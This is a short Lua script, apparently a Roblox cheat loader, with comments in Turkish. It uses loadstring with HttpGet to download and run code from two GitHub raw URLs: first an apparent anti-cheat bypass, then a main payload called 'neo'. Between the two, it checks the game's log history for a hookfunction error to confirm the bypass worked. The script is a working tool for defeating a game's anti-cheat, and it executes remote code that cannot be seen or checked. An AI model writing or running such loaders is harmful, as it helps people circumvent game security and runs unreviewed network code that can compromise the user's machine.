
loadstring(game:HttpGet("https://raw.githubusercontent.com/hubmainv4/v/refs/heads/main/acb"))()
wait(1)

local LogService = game:GetService("LogService")
local StarterGui = game:GetService("StarterGui")

local logs = LogService:GetLogHistory()
local found = false

-- Loglar arasında hatayı ara
for _, log in ipairs(logs) do
	if typeof(log) == "table" and log.message and typeof(log.message) == "string" then
		if log.message:find("function expected on argument 1, got nil on hookfunction") then
			found = true
			break
		end
	end
end

-- Hata bulunamadıysa uyarı gönder
if not found then
	StarterGui:SetCore("SendNotification", {
		Title = "AntiCheat",
		Text = "Anticheat not loaded, please restart the script",
		Duration = 5
	})
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hubmainv4/v/refs/heads/main/neo", true))()
end

